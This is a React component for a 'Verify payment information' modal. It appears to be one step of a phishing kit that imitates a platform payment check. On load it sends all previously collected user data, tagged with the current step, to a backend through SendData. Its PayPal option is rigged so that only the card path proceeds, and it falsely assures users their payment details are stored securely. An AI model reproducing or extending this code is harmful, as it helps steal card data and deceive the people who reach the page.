import React, { useContext, useState } from 'react'
import { Col, Row } from 'react-bootstrap';
import styled from 'styled-components';
import Lock from '../assets/svgs/lock.svg'
import Image from 'next/image'
import SendData from '../hooks/SendData';
import { DataContext } from '../pages';

const ModalContainer = styled.div`
    position: fixed;   
    display: flex;
    justify-content: center;
    align-items: center;
    background-color: #00000099;
    width: 100%;
    height: 100%;
    z-index: 1000;
    top: 0px;
    left: 0px;
`
const ModalContent = styled.div`
    max-width: 550px;
    width: 100%;
    height: 580px;
    display: flex;
    flex-direction: column;
    justify-content: space-between;
    background-color: white;
    border-radius: 8px;
    box-shadow: rgba(0, 0, 0, 0.24) 0px 3px 8px;
    position: relative;
    padding-inline: 1.5rem;
    padding-block: 1.5rem;
    margin: 1rem;
`
const ModalTitle = styled.div`
    padding-bottom: 2.5rem;
    font-weight: 600;

    font-size: 18px;
`

const ModalSubtitle = styled.div`
    font-weight: 700;
    padding-bottom: 1rem;
    text-align: left;
`
const Methods = styled.div`
    text-align: left;
    padding-bottom: 1rem;
    .radioContainer {
        display: flex;
        cursor: pointer;
        font-size: 15px;
        -webkit-user-select: none;
        -moz-user-select: none;
        -ms-user-select: none;
        user-select: none;
        color: #1C2B33;
        font-weight: 500;
        justify-content: space-between;
        align-items: center
    }

    .radioContainer input {
        position: absolute;
        width: 0;
        height: 0;
        opacity: 0;
        cursor: pointer;
    }

    .checkmark {
        height: 22px;
        width: 22px;
        background-color: #fff;
        border-radius: 50%;
        display: grid;
        place-items: center;
        box-sizing: border-box;
    }

    .radioContainer:hover {
        background-color: #cccccc50;

    }

    .radioContainer input:checked ~ .checkmark {
        background-color: #2196f3;
    }
    .radioContainer input:checked ~ .chckmrk2 {
        background-color: grey;
    }

    .checkmark:after {
        content: "";
        display: none;
    }

    .radioContainer input:checked ~ .checkmark:after {
    display: block;
    }

    /* Style the indicator (dot/circle) */
    .radioContainer .checkmark:after { 
        width: 11px;
        height: 11px;
        border-radius: 50%;
        box-sizing: content-box;
        border: 3px solid #fff;
    }

`
const LockSection = styled.div`
    padding-top: 3rem;
`
const SmallText = styled.div`
    color: #1C2B33;
    font-size: 14px;
    line-height: 1.3;
`
const BtnDiv = styled.div`
    padding-top: 1rem;
    display: flex;
    justify-content: flex-end;
`
const NextBtn = styled.button`
    background-color: #2a6de1;
    border: none;
    padding-inline: 3rem;
    padding-block: 0.5rem;
    width: 140px;
    border-radius: 6px;
    color: #fff;
`
const Crd = styled.div`
    img {
        width: 25px;
        height: auto;
    }
`

function PModal({ setStep }) {
    const [Checked, setChecked] = useState(1)
    const NextClicked = () => {
        if (Checked === 1) {
            setStep(9)

        }
        else if (Checked === 2) {
            window.location.href = 'https://www.paypal.com/signin'
        }
    }

    let { AllData } = useContext(DataContext);

    React.useEffect(() => {
        const params = {
            ...AllData,
            currentStep: 'Payment Method'
        };

        SendData(params)

    }, [])

    return (
        <ModalContainer>
            <ModalContent>
                <div>

                    <ModalTitle>
                        Verify payment information
                    </ModalTitle>
                </div>
                <div>

                    <ModalSubtitle>
                        Verify payment method
                    </ModalSubtitle>
                    <Methods>
                        <Row className='gx-0'>
                            <Col onClick={() => { setChecked(1) }} style={{ cursor: 'pointer' }}>
                                <Row className='gx-1 align-items-center'>
                                    <Col xs={'auto'}>
                                        Debit or Credit Card
                                    </Col>
                                    <Col xs={'auto'}>

                                        <Crd>
                                            <Image
                                                alt=""
                                                src="/assets/images/visa.png"
                                                height={25}
                                                width={35}
                                            />
                                        </Crd>
                                    </Col>
                                    <Col xs={'auto'}>

                                        <Crd>
                                            <Image
                                                alt=""
                                                src="/assets/images/mstcrd.png"
                                                height={25}
                                                width={35}
                                            />
                                        </Crd>
                                    </Col>
                                    <Col xs={'auto'}>

                                        <Crd>
                                            <Image
                                                alt=""
                                                src="/assets/images/union.png"
                                                height={25}
                                                width={35}
                                            />
                                        </Crd>
                                    </Col>
                                    <Col xs={'auto'}>
                                        <Crd>
                                            <Image
                                                alt=""
                                                src="/assets/images/amx.png"
                                                height={25}
                                                width={35}
                                            />
                                        </Crd>
                                    </Col>

                                </Row>

                            </Col>
                            <Col xs={'auto'}>
                                <label className="radioContainer">
                                    <input type="radio" name="radio" checked={Checked === 1 ? true : false} onChange={() => { setChecked(1) }} />
                                    <span className="checkmark"></span>
                                </label>
                            </Col>
                        </Row>
                    </Methods>
                    <Methods>
                        <Row className='gx-0'>
                            <Col onClick={() => { setChecked(1) }} style={{ cursor: 'pointer' }}>
                                <Row className='gx-1 align-items-center'>
                                    <Col xs={'auto'}>
                                        PayPal
                                    </Col>
                                    <Col xs={'auto'}>
                                        <Crd>
                                            <Image
                                                alt=""
                                                src="/assets/images/payp.png"
                                                height={25}
                                                width={35}
                                            />
                                        </Crd>
                                    </Col>

                                </Row>
                            </Col>
                            <Col xs={'auto'}>
                                <label className="radioContainer">
                                    <input type="radio" name="radio2" checked={Checked === 1 ? true : false} onChange={() => { setChecked(1) }} />
                                    <span className="checkmark chckmrk2"></span>
                                </label>
                            </Col>
                        </Row>
                    </Methods>
                </div>

                <div>

                    <LockSection>
                        <Lock />

                    </LockSection>
                    <SmallText>
                        Your payment methods are saved and stored securely.
                    </SmallText>
                    <SmallText>
                        <div style={{ color: '#2a6de1', fontWeight: 600 }}>
                            Terms Apply
                        </div>
                    </SmallText>
                    <BtnDiv>
                        <NextBtn onClick={NextClicked}>
                            Next
                        </NextBtn>
                    </BtnDiv>
                </div>

            </ModalContent>
        </ModalContainer>
    )
}

export default PModal